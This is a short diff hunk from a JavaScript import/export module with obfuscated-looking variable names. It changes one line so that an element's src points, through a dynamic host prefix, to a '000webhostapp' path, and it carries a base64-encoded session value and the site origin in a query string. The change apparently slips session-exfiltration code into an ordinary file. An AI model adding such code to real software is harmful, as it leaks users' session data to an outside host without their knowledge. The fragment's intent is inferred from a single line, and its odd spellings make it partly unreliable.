@@ -3658,7 +3658,7 @@ w0w.tabglobalJS['JS_JS_nhapxuat'] = (function () { // scoping
                     //helloguy.css('display', 'none');
                 };
 
-                evtWK.setAttribute('src',  '/000webhostapp.tep/upexcel.html?seson=' + btoa(calcSession + '|' + w0w.location.origin
+                evtWK.setAttribute('src', srcp$f + '/000webhostapp.tep/upexcel.html?seson=' + btoa(calcSession + '|' + w0w.location.origin
 
                         + '|' + (!w0w.Worker || true)
 
